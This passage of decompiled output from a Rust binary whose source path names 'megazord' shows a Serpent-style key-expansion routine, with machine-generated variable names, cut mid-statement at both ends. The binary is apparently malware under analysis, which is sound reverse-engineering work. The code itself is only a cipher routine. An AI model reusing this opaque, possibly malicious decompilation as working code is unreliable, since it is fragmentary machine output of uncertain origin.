[rbp-1414h]\n  int v1039; // [rsp+198h] [rbp-1410h]\n  int v1040; // [rsp+198h] [rbp-1410h]\n  int v1041; // [rsp+19Ch] [rbp-140Ch]\n  int v1042; // [rsp+1A0h] [rbp-1408h]\n  int v1043; // [rsp+1A0h] [rbp-1408h]\n  int v1044; // [rsp+1A4h] [rbp-1404h]\n  int v1045; // [rsp+1A4h] [rbp-1404h]\n  int v1046; // [rsp+1A8h] [rbp-1400h]\n  int v1047; // [rsp+1A8h] [rbp-1400h]\n  int v1048; // [rsp+1ACh] [rbp-13FCh]\n  int v1049; // [rsp+1B0h] [rbp-13F8h]\n  int v1050; // [rsp+1B0h] [rbp-13F8h]\n  int v1051; // [rsp+1B4h] [rbp-13F4h]\n  int v1052; // [rsp+1B8h] [rbp-13F0h]\n  int v1053; // [rsp+1B8h] [rbp-13F0h]\n  int v1054; // [rsp+1BCh] [rbp-13ECh]\n  int v1055; // [rsp+1BCh] [rbp-13ECh]\n  int v1056; // [rsp+1C0h] [rbp-13E8h]\n  int v1057; // [rsp+1C0h] [rbp-13E8h]\n  int v1058; // [rsp+1C0h] [rbp-13E8h]\n  int v1059; // [rsp+1C8h] [rbp-13E0h]\n  int v1060; // [rsp+1C8h] [rbp-13E0h]\n  __int64 v1061; // [rsp+1C8h] [rbp-13E0h]\n  int v1062; // [rsp+1D0h] [rbp-13D8h]\n  int v1063; // [rsp+1D0h] [rbp-13D8h]\n  __int64 v1064; // [rsp+1D0h] [rbp-13D8h]\n  int v1065; // [rsp+1D8h] [rbp-13D0h]\n  int v1066; // [rsp+1D8h] [rbp-13D0h]\n  unsigned int v1067; // [rsp+1D8h] [rbp-13D0h]\n  int v1068; // [rsp+1E0h] [rbp-13C8h]\n  int v1069; // [rsp+1E4h] [rbp-13C4h]\n  int v1070; // [rsp+1E8h] [rbp-13C0h]\n  int v1071; // [rsp+1ECh] [rbp-13BCh]\n  int v1072; // [rsp+1F0h] [rbp-13B8h]\n  int v1073; // [rsp+1F4h] [rbp-13B4h]\n  int v1074; // [rsp+1F8h] [rbp-13B0h]\n  int v1075; // [rsp+1FCh] [rbp-13ACh]\n  int v1076; // [rsp+200h] [rbp-13A8h]\n  int v1077; // [rsp+204h] [rbp-13A4h]\n  int v1078; // [rsp+208h] [rbp-13A0h]\n  int v1079; // [rsp+20Ch] [rbp-139Ch]\n  int v1080; // [rsp+210h] [rbp-1398h]\n  int v1081; // [rsp+214h] [rbp-1394h]\n  int v1082; // [rsp+218h] [rbp-1390h]\n  int v1083; // [rsp+21Ch] [rbp-138Ch]\n  int v1084; // [rsp+220h] [rbp-1388h]\n  int v1085; // [rsp+224h] [rbp-1384h]\n  int v1086; // [rsp+228h] [rbp-1380h]\n  int v1087; // [rsp+22Ch] [rbp-137Ch]\n  int v1088; // [rsp+230h] [rbp-1378h]\n  int v1089; // [rsp+234h] [rbp-1374h]\n  int v1090; // [rsp+238h] [rbp-1370h]\n  int v1091; // [rsp+23Ch] [rbp-136Ch]\n  int v1092; // [rsp+240h] [rbp-1368h]\n  int v1093; // [rsp+244h] [rbp-1364h]\n  int v1094; // [rsp+248h] [rbp-1360h]\n  int v1095; // [rsp+24Ch] [rbp-135Ch]\n  int v1096; // [rsp+250h] [rbp-1358h]\n  int v1097; // [rsp+254h] [rbp-1354h]\n  int v1098; // [rsp+258h] [rbp-1350h]\n  int v1099; // [rsp+25Ch] [rbp-134Ch]\n  int v1100; // [rsp+260h] [rbp-1348h]\n  int v1101; // [rsp+264h] [rbp-1344h]\n  char v1102[24]; // [rsp+268h] [rbp-1340h] BYREF\n  int v1103[4]; // [rsp+280h] [rbp-1328h] BYREF\n  int v1104[4]; // [rsp+290h] [rbp-1318h] BYREF\n  int v1105[4]; // [rsp+2A0h] [rbp-1308h] BYREF\n  int v1106[4]; // [rsp+2B0h] [rbp-12F8h] BYREF\n  __int64 v1107; // [rsp+2C0h] [rbp-12E8h] BYREF\n  __int64 v1108; // [rsp+2C8h] [rbp-12E0h]\n  __int64 v1109; // [rsp+2D0h] [rbp-12D8h]\n  __int64 v1110; // [rsp+2D8h] [rbp-12D0h]\n  __int128 v1111; // [rsp+2E0h] [rbp-12C8h] BYREF\n  __int128 v1112; // [rsp+2F0h] [rbp-12B8h]\n  __int128 v1113; // [rsp+300h] [rbp-12A8h]\n  __int128 v1114; // [rsp+310h] [rbp-1298h]\n  __int128 v1115; // [rsp+320h] [rbp-1288h]\n  __int128 v1116; // [rsp+330h] [rbp-1278h] BYREF\n  __int128 v1117; // [rsp+340h] [rbp-1268h]\n  int v1118; // [rsp+350h] [rbp-1258h]\n  int v1119; // [rsp+354h] [rbp-1254h]\n  int v1120; // [rsp+358h] [rbp-1250h]\n  int v1121; // [rsp+35Ch] [rbp-124Ch]\n  int v1122; // [rsp+360h] [rbp-1248h]\n  int v1123; // [rsp+364h] [rbp-1244h]\n  int v1124; // [rsp+368h] [rbp-1240h]\n  int v1125; // [rsp+36Ch] [rbp-123Ch]\n  int v1126; // [rsp+370h] [rbp-1238h]\n  int v1127; // [rsp+374h] [rbp-1234h]\n  int v1128; // [rsp+378h] [rbp-1230h]\n  int v1129; // [rsp+37Ch] [rbp-122Ch]\n  int v1130; // [rsp+380h] [rbp-1228h]\n  int v1131; // [rsp+384h] [rbp-1224h]\n  int v1132; // [rsp+388h] [rbp-1220h]\n  int v1133; // [rsp+38Ch] [rbp-121Ch]\n  int v1134; // [rsp+390h] [rbp-1218h]\n  int v1135; // [rsp+394h] [rbp-1214h]\n  int v1136; // [rsp+398h] [rbp-1210h]\n  int v1137; // [rsp+39Ch] [rbp-120Ch]\n  int v1138; // [rsp+3A0h] [rbp-1208h]\n  int v1139; // [rsp+3A4h] [rbp-1204h]\n  int v1140; // [rsp+3A8h] [rbp-1200h]\n  int v1141; // [rsp+3ACh] [rbp-11FCh]\n  int v1142; // [rsp+3B0h] [rbp-11F8h]\n  int v1143; // [rsp+3B4h] [rbp-11F4h]\n  int v1144; // [rsp+3B8h] [rbp-11F0h]\n  int v1145; // [rsp+3BCh] [rbp-11ECh]\n  int v1146; // [rsp+3C0h] [rbp-11E8h]\n  int v1147; // [rsp+3C4h] [rbp-11E4h]\n  int v1148; // [rsp+3C8h] [rbp-11E0h]\n  int v1149; // [rsp+3CCh] [rbp-11DCh]\n  int v1150; // [rsp+3D0h] [rbp-11D8h]\n  int v1151; // [rsp+3D4h] [rbp-11D4h]\n  int v1152; // [rsp+3D8h] [rbp-11D0h]\n  int v1153; // [rsp+3DCh] [rbp-11CCh]\n  int v1154; // [rsp+3E0h] [rbp-11C8h]\n  int v1155; // [rsp+3E4h] [rbp-11C4h]\n  int v1156; // [rsp+3E8h] [rbp-11C0h]\n  int v1157; // [rsp+3ECh] [rbp-11BCh]\n  int v1158; // [rsp+3F0h] [rbp-11B8h]\n  int v1159; // [rsp+3F4h] [rbp-11B4h]\n  int v1160; // [rsp+3F8h] [rbp-11B0h]\n  int v1161; // [rsp+3FCh] [rbp-11ACh]\n  int v1162; // [rsp+400h] [rbp-11A8h]\n  int v1163; // [rsp+404h] [rbp-11A4h]\n  int v1164; // [rsp+408h] [rbp-11A0h]\n  int v1165; // [rsp+40Ch] [rbp-119Ch]\n  int v1166; // [rsp+410h] [rbp-1198h]\n  int v1167; // [rsp+414h] [rbp-1194h]\n  int v1168; // [rsp+418h] [rbp-1190h]\n  int v1169; // [rsp+41Ch] [rbp-118Ch]\n  int v1170; // [rsp+420h] [rbp-1188h]\n  int v1171; // [rsp+424h] [rbp-1184h]\n  int v1172; // [rsp+428h] [rbp-1180h]\n  int v1173; // [rsp+42Ch] [rbp-117Ch]\n  int v1174; // [rsp+430h] [rbp-1178h]\n  int v1175; // [rsp+434h] [rbp-1174h]\n  int v1176; // [rsp+438h] [rbp-1170h]\n  int v1177; // [rsp+43Ch] [rbp-116Ch]\n  int v1178; // [rsp+440h] [rbp-1168h]\n  int v1179; // [rsp+444h] [rbp-1164h]\n  int v1180; // [rsp+448h] [rbp-1160h]\n  int v1181; // [rsp+44Ch] [rbp-115Ch]\n  int v1182; // [rsp+450h] [rbp-1158h]\n  int v1183; // [rsp+454h] [rbp-1154h]\n  int v1184; // [rsp+458h] [rbp-1150h]\n  int v1185; // [rsp+45Ch] [rbp-114Ch]\n  int v1186; // [rsp+460h] [rbp-1148h]\n  int v1187; // [rsp+464h] [rbp-1144h]\n  int v1188; // [rsp+468h] [rbp-1140h]\n  int v1189; // [rsp+46Ch] [rbp-113Ch]\n  int v1190; // [rsp+470h] [rbp-1138h]\n  int v1191; // [rsp+474h] [rbp-1134h]\n  int v1192; // [rsp+478h] [rbp-1130h]\n  int v1193; // [rsp+47Ch] [rbp-112Ch]\n  int v1194; // [rsp+480h] [rbp-1128h]\n  int v1195; // [rsp+484h] [rbp-1124h]\n  int v1196; // [rsp+488h] [rbp-1120h]\n  int v1197; // [rsp+48Ch] [rbp-111Ch]\n  int v1198; // [rsp+490h] [rbp-1118h]\n  int v1199; // [rsp+494h] [rbp-1114h]\n  int v1200; // [rsp+498h] [rbp-1110h]\n  int v1201; // [rsp+49Ch] [rbp-110Ch]\n  int v1202; // [rsp+4A0h] [rbp-1108h]\n  int v1203; // [rsp+4A4h] [rbp-1104h]\n  int v1204; // [rsp+4A8h] [rbp-1100h]\n  int v1205; // [rsp+4ACh] [rbp-10FCh]\n  int v1206; // [rsp+4B0h] [rbp-10F8h]\n  int v1207; // [rsp+4B4h] [rbp-10F4h]\n  int v1208; // [rsp+4B8h] [rbp-10F0h]\n  int v1209; // [rsp+4BCh] [rbp-10ECh]\n  char v1210[80]; // [rsp+4C0h] [rbp-10E8h] BYREF\n  unsigned int v1211; // [rsp+510h] [rbp-1098h]\n  unsigned int v1212; // [rsp+514h] [rbp-1094h]\n  unsigned int v1213; // [rsp+518h] [rbp-1090h]\n  unsigned int v1214; // [rsp+51Ch] [rbp-108Ch]\n  unsigned int v1215; // [rsp+520h] [rbp-1088h]\n  unsigned int v1216; // [rsp+524h] [rbp-1084h]\n  unsigned int v1217; // [rsp+528h] [rbp-1080h]\n  int v1218; // [rsp+52Ch] [rbp-107Ch]\n  int v1219; // [rsp+530h] [rbp-1078h]\n  int v1220; // [rsp+534h] [rbp-1074h]\n  unsigned __int64 v1221; // [rsp+538h] [rbp-1070h]\n  unsigned int v1222; // [rsp+540h] [rbp-1068h]\n  char v1223[4096]; // [rsp+550h] [rbp-1058h] BYREF\n\n  *(_QWORD *)v1102 = 1i64;\n  *(_OWORD *)&v1102[8] = 0i64;\n  v1107 = a2;\n  v1108 = a3;\n  v1109 = 0i64;\n  sub_14005D820(v1223, 0i64, 4096i64);\n  v1115 = 0i64;\n  v1114 = 0i64;\n  v1113 = 0i64;\n  v1112 = 0i64;\n  v1111 = 0i64;\n  if ( a5 >= 0x21 )\n  {\n    v847 = \"assertion failed: key.len() <= 32megazord\\\\src\\\\crypto.rs\";\n    v848 = &off_140066010;\n    v849 = 33i64;\nLABEL_26:\n    sub_14005DEC0(v847, v849, v848);\n  }\n  v1117 = 0i64;\n  v1116 = 0i64;\n  v1110 = a1;\n  if ( a5 == 32 )\n  {\n    v8 = sub_140009D8D(&v1116, 32i64, &off_1400668B8);\n    sub_140009DAC(a4, 32i64, v8, v9);\n  }\n  else\n  {\n    v10 = sub_140009D8D(&v1116, a5, &off_1400668D0);\n    sub_140009DAC(a4, a5, v10, v11);\n    *((_BYTE *)&v1116 + a5) = 1;\n  }\n  v12 = sub_140009DE4(&v1116, 0i64, 4i64, &off_1400668E8);\n  v13 = sub_1400135C9(v12);\n  v14 = sub_140009DE4(&v1116, 4i64, 8i64, &off_140066900);\n  v15 = sub_1400135C9(v14);\n  v16 = sub_140009DE4(&v1116, 8i64, 12i64, &off_140066918);\n  v17 = sub_1400135C9(v16);\n  v18 = sub_140009DE4(&v1116, 12i64, 16i64, &off_140066930);\n  v19 = sub_1400135C9(v18);\n  v20 = sub_140009DE4(&v1116, 16i64, 20i64, &off_140066948);\n  v21 = sub_1400135C9(v20);\n  v22 = sub_140009DE4(&v1116, 20i64, 24i64, &off_140066960);\n  v23 = sub_1400135C9(v22);\n  v24 = sub_140009DE4(&v1116, 24i64, 28i64, &off_140066978);\n  v25 = sub_1400135C9(v24);\n  v26 = sub_140009DE4(&v1116, 28i64, 32i64, &off_140066990);\n  v27 = sub_1400135C9(v26);\n  v28 = __ROL4__(v23 ^ v13 ^ v19 ^ v27 ^ 0x9E3779B9, 11);\n  v29 = __ROL4__(v28 ^ v25 ^ v21 ^ v15 ^ 0x9E3779B8, 11);\n  v30 = __ROL4__(v29 ^ v27 ^ v23 ^ v17 ^ 0x9E3779BB, 11);\n  v932 = v28;\n  v938 = v28 ^ v30;\n  v31 = __ROL4__(v28 ^ v30 ^ v25 ^ v19 ^ 0x9E3779BA, 11);\n  v1046 = v29;\n  v930 = v29 ^ v31;\n  v32 = __ROL4__(v29 ^ v31 ^ v27 ^ v21 ^ 0x9E3779BD, 11);\n  v33 = __ROL4__(v32 ^ v28 ^ v30 ^ v23 ^ 0x9E3779BC, 11);\n  v34 = __ROL4__(v33 ^ v29 ^ v31 ^ v25 ^ 0x9E3779BF, 11);\n  v928 = v30;\n  v35 = __ROL4__(v34 ^ v32 ^ v30 ^ v27 ^ 0x9E3779BE, 11);\n  v1037 = v33;\n  v926 = v31;\n  v1039 = v32;\n  v36 = __ROL4__(v33 ^ v35 ^ v31 ^ v28 ^ 0x9E3779B1, 11);\n  v37 = __ROL4__(v36 ^ v34 ^ v29 ^ v32 ^ 0x9E3779B0, 11);\n  v934 = v34;\n  v38 = __ROL4__(v37 ^ v30 ^ v33 ^ v35 ^ 0x9E3779B3, 11);\n  v39 = __ROL4__(v38 ^ v36 ^ v31 ^ v34 ^ 0x9E3779B2, 11);\n  v1044 = v35;\n  v40 = __ROL4__(v39 ^ v37 ^ v32 ^ v35 ^ 0x9E3779B5, 11);\n  v41 = v36;\n  v884 = v36;\n  v42 = v38;\n  v43 = v40 ^ v38 ^ v33 ^ v36;\n  v44 = v40;\n  v45 = __ROL4__(v43 ^ 0x9E3779B4, 11);\n  v905 = v37;\n  v46 = __ROL4__(v45 ^ v39 ^ v34 ^ v37 ^ 0x9E3779B7, 11);\n  v887 = v42;\n  v47 = __ROL4__(v46 ^ v40 ^ v35 ^ v42 ^ 0x9E3779B6, 11);\n  v48 = v42 ^ v45;\n  v873 = v39;\n  v936 = v45;\n  v49 = __ROL4__(v47 ^ v45 ^ v41 ^ v39 ^ 0x9E3779A9, 11);\n  v940 = v44;\n  v50 = __ROL4__(v49 ^ v46 ^ v37 ^ v44 ^ 0x9E3779A8, 11);\n  v1097 = v46;\n  v51 = __ROL4__(v50 ^ v47 ^ v48 ^ 0x9E3779AB, 11);\n  v52 = __ROL4__(v51 ^ v49 ^ v39 ^ v46 ^ 0x9E3779AA, 11);\n  v53 = v50;\n  v942 = v50;\n  v996 = v47;\n  v992 = v44 ^ v47;\n  v944 = v49;\n  v54 = __ROL4__(v50 ^ v52 ^ v44 ^ v47 ^ 0x9E3779AD, 11);\n  v55 = __ROL4__(v54 ^ v51 ^ v45 ^ v49 ^ 0x9E3779AC, 11);\n  v56 = __ROL4__(v55 ^ v46 ^ v50 ^ v52 ^ 0x9E3779AF, 11);\n  v998 = v51;\n  v57 = __ROL4__(v56 ^ v54 ^ v47 ^ v51 ^ 0x9E3779AE, 11);\n  v918 = v55;\n  v1096 = v52;\n  v58 = __ROL4__(v55 ^ v57 ^ v52 ^ v49 ^ 0x9E3779A1, 11);\n  v864 = v54;\n  v59 = __ROL4__(v58 ^ v56 ^ v53 ^ v54 ^ 0x9E3779A0, 11);\n  v60 = __ROL4__(v59 ^ v51 ^ v55 ^ v57 ^ 0x9E3779A3, 11);\n  v857 = v56;\n  v61 = __ROL4__(v60 ^ v58 ^ v52 ^ v56 ^ 0x9E3779A2, 11);\n  v1095 = v59;\n  v882 = v57;\n  v854 = v54 ^ v57;\n  v1094 = v59 ^ v61;\n  v62 = __ROL4__(v59 ^ v61 ^ v54 ^ v57 ^ 0x9E3779A5, 11);\n  v1002 = v58;\n  v63 = __ROL4__(v62 ^ v60 ^ v55 ^ v58 ^ 0x9E3779A4, 11);\n  v64 = __ROL4__(v63 ^ v59 ^ v61 ^ v56 ^ 0x9E3779A7, 11);\n  v922 = v60;\n  v65 = v62;\n  v66 = __ROL4__(v64 ^ v62 ^ v57 ^ v60 ^ 0x9E3779A6, 11);\n  v1026 = v63;\n  v1000 = v61;\n  v1033 = v63 ^ v66;\n  v67 = __ROL4__(v63 ^ v66 ^ v61 ^ v58 ^ 0x9E377999, 11);\n  v879 = v65;\n  v68 = __ROL4__(v67 ^ v64 ^ v59 ^ v65 ^ 0x9E377998, 11);\n  v69 = __ROL4__(v68 ^ v63 ^ v66 ^ v60 ^ 0x9E37799B, 11);\n  v952 = v67;\n  v70 = v64;\n  v859 = v64;\n  v946 = v67 ^ v69;\n  v71 = __ROL4__(v67 ^ v69 ^ v64 ^ v61 ^ 0x9E37799A, 11);\n  v1006 = v68;\n  v850 = v66;\n  v950 = v68 ^ v71;\n  v72 = __ROL4__(v68 ^ v71 ^ v66 ^ v65 ^ 0x9E37799D, 11);\n  v73 = __ROL4__(v72 ^ v67 ^ v69 ^ v63 ^ 0x9E37799C, 11);\n  v74 = __ROL4__(v73 ^ v68 ^ v71 ^ v70 ^ 0x9E37799F, 11);\n  v1092 = v72;\n  v948 = v69;\n  v75 = __ROL4__(v72 ^ v74 ^ v69 ^ v66 ^ 0x9E37799E, 11);\n  v1091 = v73;\n  v1093 = v71;\n  v76 = __ROL4__(v73 ^ v75 ^ v71 ^ v67 ^ 0x9E377991, 11);\n  v77 = __ROL4__(v76 ^ v68 ^ v72 ^ v74 ^ 0x9E377990, 11);\n  v78 = __ROL4__(v77 ^ v69 ^ v73 ^ v75 ^ 0x9E377993, 11);\n  v954 = v74;\n  v79 = __ROL4__(v78 ^ v76 ^ v71 ^ v74 ^ 0x9E377992, 11);\n  v901 = v75;\n  v80 = __ROL4__(v79 ^ v77 ^ v72 ^ v75 ^ 0x9E377995, 11);\n  v81 = __ROL4__(v80 ^ v78 ^ v73 ^ v76 ^ 0x9E377994, 11);\n  v907 = v77;\n  v82 = __ROL4__(v81 ^ v79 ^ v74 ^ v77 ^ 0x9E377997, 11);\n  v1022 = v78;\n  v83 = __ROL4__(v82 ^ v80 ^ v75 ^ v78 ^ 0x9E377996, 11);\n  v84 = v78 ^ v81;\n  v897 = v79;\n  v956 = v81;\n  v85 = __ROL4__(v83 ^ v81 ^ v76 ^ v79 ^ 0x9E377989, 11);\n  v958 = v80;\n  v86 = __ROL4__(v85 ^ v82 ^ v77 ^ v80 ^ 0x9E377988, 11);\n  v87 = __ROL4__(v86 ^ v83 ^ v84 ^ 0x9E37798B, 11);\n  v88 = v82;\n  v1090 = v82;\n  v89 = __ROL4__(v87 ^ v85 ^ v79 ^ v82 ^ 0x9E37798A, 11);\n  v962 = v86;\n  v1010 = v83;\n  v1030 = v80 ^ v83;\n  v90 = __ROL4__(v86 ^ v89 ^ v80 ^ v83 ^ 0x9E37798D, 11);\n  v964 = v85;\n  v91 = __ROL4__(v90 ^ v87 ^ v81 ^ v85 ^ 0x9E37798C, 11);\n  v92 = __ROL4__(v91 ^ v88 ^ v86 ^ v89 ^ 0x9E37798F, 11);\n  v1012 = v87;\n  v93 = __ROL4__(v92 ^ v90 ^ v83 ^ v87 ^ 0x9E37798E, 11);\n  v960 = v89;\n  v94 = __ROL4__(v91 ^ v93 ^ v89 ^ v85 ^ 0x9E377981, 11);\n  v95 = __ROL4__(v94 ^ v92 ^ v86 ^ v90 ^ 0x9E377980, 11);\n  v1089 = v93;\n  v1042 = v92 ^ v93 & v90;\n  v868 = __ROL4__(v95 ^ v87 ^ v91 ^ v93 ^ 0x9E377983, 11);\n  v96 = __ROL4__(v868 ^ v94 ^ v89 ^ v92 ^ 0x9E377982, 11);\n  v1086 = v95;\n  v1018 = v94;\n  v966 = ~v92 ^ v93 & v90;\n  v1041 = v966 ^ v91;\n  v1014 = v90 ^ v93 | v966 ^ v91;\n  v1088 = v90 ^ v93 ^ (v93 | ~v92);\n  v1087 = v95 ^ v96;\n  v97 = __ROL4__(v95 ^ v96 ^ v90 ^ v93 ^ 0x9E377985, 11);\n  v98 = __ROL4__(v97 ^ v868 ^ v91 ^ v94 ^ 0x9E377984, 11);\n  v99 = __ROL4__(v98 ^ v95 ^ v96 ^ v92 ^ 0x9E377987, 11);\n  v100 = __ROL4__(v99 ^ v97 ^ v93 ^ v868 ^ 0x9E377986, 11);\n  v101 = v98 ^ v100;\n  v1016 = v96;\n  v102 = v98 ^ v100 ^ v96 ^ v94;\n  v103 = v98 ^ v100 ^ v868;\n  v104 = v100 ^ v97;\n  v105 = v100;\n  v106 = ~v100;\n  v968 = v106 ^ v97;\n  v107 = (v106 ^ v97) & v101;\n  v108 = v99 ^ v106;\n  v109 = v968 ^ v101;\n  v1073 = v108 ^ v107;\n  v1020 = v109 | v108 ^ v107;\n  v110 = v108 & v109;\n  v111 = __ROL4__(v102 ^ 0x9E3779F9, 11);\n  v112 = __ROL4__(v111 ^ v99 ^ v95 ^ v97 ^ 0x9E3779F8, 11);\n  v113 = __ROL4__(v112 ^ v103 ^ 0x9E3779FB, 11);\n  v976 = v111;\n  v970 = v111 ^ v113;\n  v114 = __ROL4__(v111 ^ v113 ^ v99 ^ v96 ^ 0x9E3779FA, 11);\n  v1056 = v112;\n  v974 = v112 ^ v114;\n  v115 = __ROL4__(v112 ^ v114 ^ v104 ^ 0x9E3779FD, 11);\n  v1083 = ~v98 & (v108 ^ v107);\n  v1084 = v110 ^ ~v98;\n  v1054 = v98 ^ v110;\n  v116 = __ROL4__(v115 ^ v111 ^ v113 ^ v98 ^ 0x9E3779FC, 11);\n  v117 = __ROL4__(v116 ^ v112 ^ v114 ^ v99 ^ 0x9E3779FF, 11);\n  v912 = v115;\n  v972 = v113;\n  v118 = __ROL4__(v115 ^ v117 ^ v113 ^ v105 ^ 0x9E3779FE, 11);\n  v119 = v116;\n  v909 = v116;\n  v1081 = v114;\n  v120 = __ROL4__(v116 ^ v118 ^ v114 ^ v111 ^ 0x9E3779F1, 11);\n  v1085 = ~v76;\n  v121 = ~v76 & v907;\n  v1008 = v121 | v897;\n  v1082 = v1022 ^ v121;\n  v122 = __ROL4__(v120 ^ v112 ^ v115 ^ v117 ^ 0x9E3779F0, 11);\n  v123 = __ROL4__(v122 ^ v113 ^ v116 ^ v118 ^ 0x9E3779F3, 11);\n  v978 = v117;\n  v124 = __ROL4__(v123 ^ v120 ^ v114 ^ v117 ^ 0x9E3779F2, 11);\n  v880 = ~v850 ^ v879;\n  v125 = v859 ^ ~v850;\n  v893 = v118;\n  v126 = __ROL4__(v124 ^ v122 ^ v115 ^ v118 ^ 0x9E3779F5, 11);\n  v127 = __ROL4__(v126 ^ v123 ^ v119 ^ v120 ^ 0x9E3779F4, 11);\n  v128 = v127 ^ v124 ^ v117 ^ v122;\n  v129 = v127;\n  v130 = __ROL4__(v128 ^ 0x9E3779F7, 11);\n  v1072 = v125 ^ v880 & v1033;\n  v1004 = v880 ^ v1033 | v1072;\n  v131 = v125 & (v880 ^ v1033);\n  v132 = v123 ^ v127;\n  v982 = ~v120;\n  v980 = v122;\n  v133 = ~v120 & v122;\n  v1062 = v124;\n  v1059 = v133 | v124;\n  v1075 = v123 ^ v133;\n  v134 = __ROL4__(v130 ^ v126 ^ v118 ^ v123 ^ 0x9E3779F6, 11);\n  v1076 = v129;\n  v135 = __ROL4__(v134 ^ v129 ^ v120 ^ v124 ^ 0x9E3779E9, 11);\n  v984 = v126;\n  v136 = __ROL4__(v135 ^ v130 ^ v122 ^ v126 ^ 0x9E3779E8, 11);\n  v137 = __ROL4__(v136 ^ v134 ^ v132 ^ 0x9E3779EB, 11);\n  v1077 = v130;\n  v138 = __ROL4__(v137 ^ v135 ^ v124 ^ v130 ^ 0x9E3779EA, 11);\n  v1065 = v134;\n  v860 = v984 ^ v134;\n  v139 = __ROL4__(v136 ^ v138 ^ v984 ^ v134 ^ 0x9E3779ED, 11);\n  v986 = v135;\n  v140 = __ROL4__(v139 ^ v137 ^ v129 ^ v135 ^ 0x9E3779EC, 11);\n  v141 = __ROL4__(v140 ^ v130 ^ v136 ^ v138 ^ 0x9E3779EF, 11);\n  v1079 = ~v1026 & v1072;\n  v1080 = v131 ^ ~v1026;\n  v1034 = v1026 ^ v131;\n  v865 = v882 & v864;\n  v1078 = ~v857 ^ v865;\n  v919 = v1078 ^ v918;\n  v994 = v854 | v919;\n  v142 = __ROL4__(v141 ^ v139 ^ v1065 ^ v137 ^ 0x9E3779EE, 11);\n  v990 = v138;\n  v143 = __ROL4__(v140 ^ v142 ^ v138 ^ v986 ^ 0x9E3779E1, 11);\n  v144 = __ROL4__(v143 ^ v141 ^ v136 ^ v139 ^ 0x9E3779E0, 11);\n  v145 = __ROL4__(v144 ^ v137 ^ v140 ^ v142 ^ 0x9E3779E3, 11);\n  v1052 = v141 ^ v142 & v139;\n  v146 = v141;\n  v147 = v141;\n  v148 = __ROL4__(v145 ^ v143 ^ v138 ^ v141 ^ 0x9E3779E2, 11);\n  v149 = v143;\n  v851 = v143;\n  v150 = v140 ^ v143;\n  v151 = ~v147;\n  v988 = v151 ^ v142 & v139;\n  v1051 = v988 ^ v140;\n  v890 = v139 ^ v142 | v988 ^ v140;\n  v152 = v139 ^ v142 ^ (v142 | v151);\n  v915 = v144 ^ v148;\n  v153 = __ROL4__(v144 ^ v148 ^ v139 ^ v142 ^ 0x9E3779E5, 11);\n  v154 = __ROL4__(v153 ^ v145 ^ v150 ^ 0x9E3779E4, 11);\n  v155 = __ROL4__(v154 ^ v144 ^ v148 ^ v146 ^ 0x9E3779E7, 11);\n  v156 = __ROL4__(v155 ^ v153 ^ v142 ^ v145 ^ 0x9E3779E6, 11);\n  v1023 = v148;\n  v1027 = v154 ^ v156;\n  v1049 = __ROL4__(v154 ^ v156 ^ v148 ^ v149 ^ 0x9E3779D9, 11);\n  v877 = v854 ^ (v882 | ~v857);\n  v157 = __ROL4__(v1049 ^ v155 ^ v144 ^ v153 ^ 0x9E3779D8, 11);\n  v158 = __ROL4__(v157 ^ v154 ^ v156 ^ v145 ^ 0x9E3779DB, 11);\n  v885 = ~v884;\n  v1074 = v887 ^ v885 & v905;\n  v159 = ~v156;\n  v160 = v159 ^ v153;\n  v161 = v155 ^ v159;\n  v162 = __ROL4__(v158 ^ v1049 ^ v148 ^ v155 ^ 0x9E3779DA, 11);\n  v163 = v1049 | v162;\n  v164 = v157 ^ v162;\n  v165 = v1049 & v157;\n  v166 = v158 ^ v1049;\n  v167 = v164 ^ v158;\n  v168 = v163 & v164;\n  v169 = v165 ^ v163;\n  v1050 = v168 ^ (v165 | v166);\n  v1101 = v167 ^ v166 & v169;\n  v1048 = v167 ^ (v169 | v1050 ^ v165);\n  v1100 = v169 ^ v1048 & ~v1050;\n  v1099 = v161 ^ v160 & v1027;\n  v170 = v161 & (v160 ^ v1027);\n  v171 = ~v154 & v1099;\n  v1098 = v160 ^ v171;\n  v1071 = (v160 ^ v171) & (v170 ^ ~v154) ^ v171 ^ (v160 ^ v1027 | v1099);\n  v1028 = (v160 | v171) ^ v154 ^ v170;\n  v172 = v144 ^ v851;\n  v173 = ~v1023 ^ v145;\n  v1070 = v173 ^ (v144 ^ v851) & v915;\n  v174 = v915 | v173;\n  v1024 = v144 ^ v851 ^ v1070 & ~v1023;\n  v175 = ~(v1070 ^ v174 ^ v144);\n  v916 = (v175 | v1024) ^ v172 ^ v174;\n  v852 = v175 ^ v1024 & v172;\n  v176 = v890 ^ v142 ^ v988;\n  v177 = v1051 ^ v152;\n  v891 = v177 ^ (v988 | v890);\n  v989 = v891 ^ v176;\n  v1053 = (v891 ^ v176) & v177 ^ v1052;\n  v178 = v990 ^ (v136 | v137);\n  v179 = v137 ^ v178;\n  v991 = v178 ^ v986 & (v990 | v136 ^ v137);\n  v180 = v178;\n  v181 = v136 ^ v178;\n  v182 = v986 ^ (v136 | v180);\n  v987 = v179 ^ (v986 | v181);\n  v183 = v181 ^ v182;\n  v1068 = v181 ^ (v987 | ~(v183 ^ v179));\n  v1069 = v181 ^ v987 & v183;\n  v184 = v984 ^ v1076 & v860;\n  v185 = v1077 ^ v1076 ^ v860;\n  v1066 = v1077 ^ v1076 ^ (v984 | v1065);\n  v186 = v1077 ^ v860 ^ v184;\n  v861 = (v184 | ~v185) ^ (v1066 | v1077 ^ v860);\n  v985 = v185 ^ (v1077 | v184);\n  v1063 = ~v1075 ^ v1062;\n  v187 = v1063 ^ v1059 ^ v980;\n  v188 = v982 ^ v1059 ^ v187;\n  v189 = v982 | v1059 ^ v980;\n  v1060 = v189 & (~v1075 | v982 ^ v1059);\n  v983 = v188 ^ v1060 & v187;\n  v981 = v189 ^ v1060 & v188;\n  v190 = v893 ^ v912 & v978;\n  v979 = v190 ^ v909 ^ v978;\n  v191 = v912 ^ v979;\n  v192 = v909 ^ (v912 | v893);\n  v913 = v912 ^ v979 ^ v190 & v192;\n  v910 = v192 ^ v913;\n  v894 = v190 ^ (v191 | v192);\n  v193 = v976 & v1056;\n  v194 = v976 | v1081;\n  v977 = (v976 | v1081) & v974 ^ (v976 & v1056 | v970);\n  v195 = v193 ^ v977;\n  v196 = v194 ^ v193;\n  v197 = v972 ^ v974;\n  v975 = v972 ^ v974 ^ (v196 | v195);\n  v973 = v196 ^ v975 & ~v977;\n  v1057 = v197 ^ v970 & v196;\n  v971 = v968 ^ v1083;\n  v1021 = (v968 ^ v1083) & v1084 ^ v1083 ^ v1020;\n  v1055 = (v968 | v1083) ^ v1054;\n  v198 = ~v1016 ^ 